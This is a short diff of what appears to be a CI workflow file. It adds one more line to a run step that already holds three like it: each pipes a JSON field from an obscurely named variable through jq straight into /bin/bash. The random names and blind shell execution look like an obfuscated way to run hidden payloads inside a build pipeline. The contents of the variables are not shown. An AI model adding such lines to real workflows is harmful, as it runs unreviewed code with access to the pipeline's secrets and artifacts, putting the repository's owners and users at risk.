@@ -30,6 +30,7 @@ jobs:
           printf '%s' "$a9024" | jq -r .efavj2648 | /bin/bash
           printf '%s' "$r712" | jq -r .rlu0804 | /bin/bash
           echo $iu8128 | jq -r .fdml27792 | /bin/bash
+          echo $y78 | jq -r .ip62 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
